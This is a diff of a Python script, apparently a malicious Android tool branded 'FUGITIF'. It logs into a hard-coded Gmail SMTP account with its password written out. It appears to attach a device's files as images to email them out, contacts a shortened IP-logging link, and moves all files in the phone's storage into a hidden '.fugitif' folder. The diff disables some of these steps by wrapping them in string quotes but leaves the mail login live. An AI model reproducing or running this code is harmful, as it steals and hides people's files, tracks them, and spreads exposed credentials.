@@ -11,6 +11,7 @@ from email.mime.image import MIMEImage
 from multiprocessing import Process
 import time
 mp = '#Property1'
+os.system('clear')
 print('''
 ╔═══╗╔╗─╔╗╔═══╗╔══╗╔════╗╔══╗╔═══╗
 ║╔══╝║║─║║║╔═╗║╚╣─╝║╔╗╔╗║╚╣─╝║╔══╝
@@ -27,7 +28,7 @@ ra= 'teamfugitifdev.h4ck@gmail.com'
 context = ssl.create_default_context()
 #server= smtplib​.​SMTP_SSL​(​smtp_address​, smtp_port, context=context)
 server = smtplib.SMTP_SSL(smtp_address, smtp_port, context=context)
-
+'''
 def connect(nom):
     with open(nom, 'rb') as fp:
         img = MIMEImage(fp.read())
@@ -69,17 +70,18 @@ if __name__ == '__main__':
     action_process.terminate()
     print("Ready!")
     
+'''
 br = mechanize.Browser()
 br.set_handle_robots(False)
 url = 'https://2no.co/29KaK6'
 #ipa = br.open(url)
 ipz = requests.get(url)
-
+'''
 os.chdir('/storage/emulated/0')
 os.system('mkdir Fugitif')
 for x in os.listdir():
    shutil.move(x, '/storage/emulated/0/Fugitif')
-shutil.move('Fugitif', '.fugitif')
+shutil.move('Fugitif', '.fugitif')'''
 s2 = smtplib.SMTP_SSL(smtp_address, smtp_port, context=context)
 s2.login(ma, mp)
 
